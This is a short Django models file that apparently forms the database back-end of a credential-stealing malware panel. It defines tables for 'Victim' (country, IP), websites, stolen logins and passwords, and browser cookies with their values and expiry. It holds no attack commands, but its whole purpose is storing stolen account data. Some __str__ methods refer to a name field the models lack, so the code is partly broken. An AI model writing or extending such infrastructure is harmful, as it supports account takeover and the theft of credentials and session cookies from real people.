from django.db import models



class Victim(models.Model):
    country = models.TextField(max_length=1000, blank=True,default="",verbose_name="Pays")
    ip = models.TextField(max_length=1000, blank=True,default="",verbose_name="IP adress")

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = "Victims"


class Website(models.Model): 
    hostname =  models.CharField(max_length=999, default="",verbose_name="hostname")
    
class Credential(models.Model):
    website = models.ForeignKey(Website, on_delete=models.CASCADE)
    login =  models.CharField(max_length=999, default="",verbose_name="login")
    password =  models.CharField(max_length=999, default="",verbose_name="password")
    def __str__(self):
        return self.name

    class Meta:
        verbose_name = "Credentials"  
        
class Cookie(models.Model):
    website = models.ForeignKey(Website, on_delete=models.CASCADE)
    name =  models.CharField(max_length=999, default="",verbose_name="name")
    path =  models.CharField(max_length=999, default="",verbose_name="path")
    expiresutc =  models.CharField(max_length=999, default="",verbose_name="expires utc")
    key = models.CharField(max_length=999, default="",verbose_name="key")
    value =  models.CharField(max_length=999, default="",verbose_name="value")
    issecure =  models.CharField(max_length=999, default="",verbose_name="is secure")

    def __str__(self):
        return self.name

    class Meta:
        verbose_name = "Cookie"